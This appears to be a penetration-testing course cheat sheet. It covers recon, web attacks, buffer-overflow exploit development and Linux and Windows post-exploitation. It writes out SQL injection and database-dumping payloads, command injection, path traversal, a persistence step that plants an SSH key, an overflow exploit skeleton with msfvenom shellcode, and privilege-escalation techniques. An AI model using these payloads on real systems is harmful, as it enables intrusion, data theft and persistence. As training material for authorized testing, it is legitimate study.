# Penetration Testing Guide

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Dealing with Services](#dealing-with-services)
- [Web Exploitation](#web-exploitation)
- [Binary Analysis and Exploitation Development](#binary-analysis-and-exploitation-development)
- [Exploit Development](#exploit-development)
- [Post Exploitation: Linux](#post-exploitation-linux)
- [Post Exploitation: Windows](#post-exploitation-windows)

---

## Reconnaissance

### Initial Steps

1. **If I get an IP or network:**
   - If it's `10.50...` skip to next step
   - Otherwise, ping sweep **from target space**/box where I found the IP against the `/24`

2. **Now that I found live IPs:**
   - Scan for open ports (through dynamic tunnel from your ops box!)

3. **Now that I have open ports:**
   - Bannergrab / `nmap -sV` version scan to identify specific software/services

4. **Run additional enumeration scripts** as needed to further interrogate services:
   - SMB OS discovery
   - HTTP enum
   - etc.

---

## Dealing with Services

### SMB

- Run `smb-os-enum`

### FTP

- `wget -r` (you can provide creds -- if you have them -- to get more info)
- Actually look at what I download

### HTTP

- `wget -r` (be aware, not an active website. No interaction = no web exploitation!)
- Check for `robots.txt` and open everything in it, even if (especially if) it says denied
- Click things, open all links in new tabs so we don't forget to check them (`Ctrl + F` for `href` in source)
- Run my HTTP-enum scan script and open all pages and directories found
- View page source and developer tools (`F12`) to see if there are scripts or if it runs GET or POST, etc.

### SSH or RDP

- If I have creds or keys, log in
- If I don't, make note. Maybe I will later

---

## Web Exploitation

### Look for Input Elements

Look for input boxes, dropdowns, interactive elements, JavaScript, and PHPs.

### If you find a box you can type in:

- **Command injection:** `; whoami`
- **SQL injection:** `tom' or 1='1`
- **Directory traversal:** `../../../../../../../../etc/passwd` OR `/etc/hosts`
- **XSS:** This is not a XSS class. Just use/modify your cookie stealer stuff (usually on trouble tickets, message boards, chat logs, etc.)

### If URL contains `...php?variable=XXX`:

- Same as above but in the URL bar
- SQL is less concerned with including the `'` if the variable value is a number rather than a text string
  - Example: `option=1 OR 1=1` or `option=cars' OR 1='1`
  - Numbers don't usually require quotation marks

### If I find a place I can upload:

- Can I access the directory it uploads to? If I can't, then uploading does me no good
- Will it let me upload a malicious file? Like a script or the cmd injection thing

### SQL Injection -- Database Dumping

If my SQL injection works and I get different results (either something breaks or it shows everything):

1. **Basic test:** `tom' OR 1='1` -- tries to display everything in that table
2. **For login pages:** `tom' OR 1='1` for username and password
   - **POST method:** tends to log you in as the first entry it finds
   - **GET method:** dumps the login table (except first entry)

**Steps to dump the whole database:**

1. Identify vulnerable field using `OR 1=1`
2. Identify number of columns: `option=1 UNION SELECT 1,2,3...` until we get results
   - We need to know how many columns it needs and where the data will appear
3. **GOLDEN STATEMENT:**
   ```sql
   option' UNION SELECT table_schema,table_name,column_name[,plus extra columns as needed] FROM information_schema.columns; #
   ```
4. Duplicate tab so I don't have to do this again. Keep this open as a reference
5. Look for user-generated tables
6. Profit with:
   ```sql
   UNION SELECT [column1],[column2],[column3]... FROM [database].[table]
   ```

### Command Injection to SSH Access

If I have command injection:

1. `whoami` to know which account is running website
2. Check `/etc/passwd` to see if website user has a login shell and what their home directory is (it may not be in `/home`)
3. Ensure they have a `.ssh` directory in their home directory (if not, make it!)
4. `echo [id_rsa.pub] >> [home]/.ssh/authorized_keys`
5. Profit (by SSH'ing in)

---

## Binary Analysis and Exploitation Development

### A Wild Binary Appears!

#### 1. Static Analysis

- **cffexplorer:** file type, hashes, strings, headers, DLLs imported, is it packed?

#### 2. Behavioral Analysis

- Set up sandbox, run procmon/fakenet (if you have it)
- Run it, play around with it, take notes on what happens
- Stop it, check sandbox and snapshots to see what changed

#### 3. Dynamic Analysis

- For our purposes, this is behavioral analysis but we're using debuggers as well

#### 4. Disassembly

- Open in Ghidra and say yes to everything it asks when we import the file
- Search for strings that we found during static and behavioral analysis to find our main function
- **Option A:** Start at the beginning (with the first strings we found when we ran it) and work forward
- **Option B:** Start at the END from the result we wish to get and work backward
- Rename functions and variables to make it easier to keep up with what is happening

#### 5. Patching

- Right click on the assembly code you wish to change and change it
- Export program as PE or ELF, depending on what it was when we started
- Profit

---

## Exploit Development

### A Wild Vulnerable Binary Appears!

1. Load the binary in `gdb` and run it
2. Crash it with a segmentation fault by generating a REALLY LONG string from the Wiremask pattern generator site
3. Copy the value from the EIP field into Wiremask to determine our **OFFSET** to get us to our EIP
4. **Verify** by running binary with our script, sending:
   ```python
   offset = "A" * [whatever our offset was]
   eip = "BBBB"
   send(offset + eip)
   ```
   - EIP should be four B's. If not, offset is wrong

5. Open binary in gdb but without peda: `env gdb binary` and `unset COLUMNS` and `LINES`
6. Do step 4 again and then run `info proc map` after crashing it
7. Find `jmp esp` values to use for our EIP with:
   ```
   find /b [first address after HEAP], [last address before STACK], 0xff, 0xe4
   ```
   - Copy down 3-5 of the resulting memory addresses in case one doesn't work

8. Generate shellcode in msfconsole/msfvenom (payload = `linux/x86/execute` or something like that)
9. **Send it!**
   - As cmd line argument: `binary $(python script.py)`
   - As binary prompt for input: `binary <<< $(python script.py)`

   ```python
   #!/usr/bin/python
   offset = 'A' * [offset value]
   eip = 0x78563412  # gotta put it in backwards, so 12 34 56 78 becomes 78 56 34 12
   nop = 0x90 * 10  # for good measure/safety
   # [paste shellcode here]
   # sending syntax: (offset + eip + nop + buf)
   ```

10. Profit

### A Remote Buffer Overflow Vulnerability Exists!

1. Identify port 9999 (or whatever) is actually vulnserver/secureserver
2. Steps 2-7: ain't nobody got time for that...
3. Open a listener on your linops
4. Change the IP/port in our script we already have
5. Profit

---

## Post Exploitation: Linux

### Users and Groups

```bash
cat /etc/passwd       # (and shadow, if you're a cool kid with privs)
cat /etc/group
ls -la /home
ls -la ~
whoami
hostname
```

### Network Information

```bash
cat /etc/hosts
ss -nltp              # will show listeners
ss -auntp             # will show all the things including established connections
ip a                  # show network interfaces and addresses
ip n                  # new version of arp -a
ip r                  # shows the routing table
```

### Running Processes and Services

```bash
ps -elfH              # show processes
systemctl list-units --type service
# OR
service --status-all
ls -la /etc           # check configs as needed
```

### Check Logging

- Check for syslog/rsyslog and read config file if it's running
- `ls -latr /var/log` to see what logs updated since we arrived
- If we see any strange specific sorts of logs, check `/etc/` for configs for whatever is logging
- **Timestamps** are useful for identifying all logs associated with an event, not just ones with a specific username or IP

### Scheduled Tasks

```bash
cat /etc/crontab
# check /etc/cron* (cron.d, cron.daily, cron.monthly... etc)
# check /var/spool/cron
```

**Questions to ask:**

- Can I write to any of the above files or directories?
- Are there any jobs I can take advantage of?
- Are there any jobs I need to be concerned about?

### Files of Interest

```bash
find / -type [f for file or d for directory] -iname "what you're looking for"
```

**Directories to check:**

- `/tmp` and `/var/tmp`
- `/usr/share`
- `/root` (if I have privs)

**What to look for:**

- SSH keys, network maps, password files, etc.
- Temp files (`.swp`, etc.)
- Folders and files you can write to (bonus if they are in cron):
  ```bash
  find / -type f -writable -o -type d -writable 2>/dev/null
  ```

### Privilege Escalation

```bash
sudo -l
# SUID and SGID
find / -type f -perm /6000 -ls 2>/dev/null
```

**Check GTFOBins** for anything I find that isn't on my linops

**Techniques:**

- SSH key masquerading (steal and use existing keys or upload our public key to the user's directory)
- Looking for cronjobs that execute as root that we can write to (scripts, directories, etc.) or binaries we can overwrite
- Users with `.` in their PATH (if we know something they will run, can we put a script with the same name in a directory where we know they will run it?)
- Writable files and directories:
  ```bash
  find / -type f -writable -o -type d -writable 2>/dev/null
  ```

---

## Post Exploitation: Windows

### Users and Groups

```cmd
net user                    :: to see all users
net user [username]         :: to learn about specific users
net localgroup
net localgroup [name]       :: to learn about a specific group
query user                  :: see who is logged in
whoami
```

### Network Information

```cmd
netstat /ano                :: add /b if you have privs
ipconfig /all
arp -a
route print
net view
```

### Running Processes and Services

```cmd
tasklist /v                 :: OR task manager (GUI)
net start                   :: OR tasklist /svc OR services manager (GUI)
```

### Check Logging

```cmd
wevtutil el                 :: shows all logs
wevtutil qe [logname] /c:[# of entries] /rd:true /f:text
wevtutil qe [logname] /c:[# of entries] /rd:false /f:text /q:"*[System[(EventID=### or EventID=###)]]"
```

- Event Viewer (GUI)

### Scheduled Tasks

```cmd
schtasks /v                 :: user created stuff is probably up front
```

- Task Scheduler (GUI)

### Files of Interest

**Directories to check:**

- My user's docs
- Public documents
- Admin's docs (if you can)
- `C:\Users`
- `C:\Windows\Temp`
- Registry keys: `[HKLM|HKCU]\Software\Microsoft\Windows\CurrentVersion\[Run|RunOnce]`

### Privilege Escalation

**Techniques:**

- **DLL hijacking:** Understand DLL search order
  - Procmon to identify missing DLLs
  - msfvenom to generate malicious DLLs
- Did netstat show vulnserver or some other thing we can use our buffer overflow on?
- Find user-created services (if it has no description, probably user-created) that we can write to
- Check schtasks/task scheduler for jobs running out of files/directories we have write permissions on
- **Look for unquoted paths:** `C:\Program Files\A Directory\file` will first try to execute `C:\Program Files\A.exe`

**REMINDER:** schtasks execute when they're told to, but services will require a restart

---

## Notes

This guide is a quick reference for penetration testing workflows. Always ensure you have proper authorization before conducting any security testing activities.
